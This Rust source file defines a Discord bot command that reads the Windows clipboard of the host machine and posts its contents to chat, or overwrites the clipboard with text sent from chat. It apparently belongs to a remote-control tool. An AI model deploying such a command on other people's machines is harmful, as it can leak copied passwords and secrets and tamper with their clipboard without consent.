use crate::prelude::*;

#[poise::command(prefix_command, aliases("clip"))]
pub async fn clipboard(
    ctx: PoiseContext<'_>,
    #[description = "get | <text to set>"]
    #[rest]
    action: Option<String>,
) -> Result<(), Error> {
    let action = match action {
        Some(a) => a,
        None => {
            ctx.say("Usage: `.clipboard get` | `.clipboard <text>`").await?;
            return Ok(());
        }
    };
    
    if action == "get" {
        match clipboard_win::get_clipboard_string() {
            Ok(content) => {
                let preview = if content.len() > 1800 {
                    format!("{}...[truncated]", &content[..1800])
                } else {
                    content
                };
                ctx.say(format!("**Clipboard:**\n```\n{}\n```", preview)).await?;
            }
            Err(e) => {
                ctx.say(format!("ERROR: Failed to get clipboard: {:?}", e)).await?;
            }
        }
    } else {
        match clipboard_win::set_clipboard_string(&action) {
            Ok(_) => ctx.say("Clipboard set").await?,
            Err(e) => ctx.say(format!("ERROR: {:?}", e)).await?,
        };
    }
    Ok(())
}
